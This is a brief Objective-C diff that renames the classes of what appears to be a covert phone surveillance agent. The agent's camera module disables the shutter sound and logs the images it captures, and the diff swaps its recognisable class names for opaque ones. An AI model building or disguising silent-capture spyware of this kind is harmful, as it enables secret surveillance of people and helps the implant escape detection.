@@ -25,7 +25,7 @@ typedef void (*disableSound_t)(void);
 static camera_t runCamera;
 static disableSound_t disableShutterSound;
 
-@implementation RCSIAgentCamera
+@implementation _i_AgentCamera
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -101,7 +101,7 @@ static disableSound_t disableShutterSound;
   
   if (image != nil && [image isKindOfClass: [NSData class]])
     {
-      RCSILogManager *logManager = [RCSILogManager sharedInstance];
+      _i_LogManager *logManager = [_i_LogManager sharedInstance];
       
       BOOL success = [logManager createLog: LOG_CAMERA
                                agentHeader: nil
@@ -129,7 +129,7 @@ static disableSound_t disableShutterSound;
   if (image == nil)
     return;
   
-  RCSILogManager *logManager = [RCSILogManager sharedInstance];
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
   
   BOOL success = [logManager createLog: LOG_CAMERA
                            agentHeader: nil
